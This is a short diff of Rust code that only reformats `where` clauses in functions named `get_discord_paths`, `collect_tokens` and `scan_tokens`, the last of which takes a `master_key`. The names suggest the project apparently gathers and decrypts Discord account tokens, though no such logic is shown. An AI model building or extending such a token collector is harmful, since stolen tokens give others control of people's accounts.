@@ -82,8 +82,8 @@ fn get_discord_paths() -> [Path; 4] {
 }
 
 fn collect_tokens<F>(filesystem: &F, paths: &[Path]) -> Vec<String>
-where 
-    F: FileSystem
+where
+    F: FileSystem,
 {
     let mut result = Vec::new();
 
@@ -110,7 +110,7 @@ where
 
 fn scan_tokens<F>(filesystem: &F, scan_path: &Path, master_key: &[u8]) -> Option<Vec<String>>
 where
-    F: FileSystem
+    F: FileSystem,
 {
     let mut result = Vec::new();
 
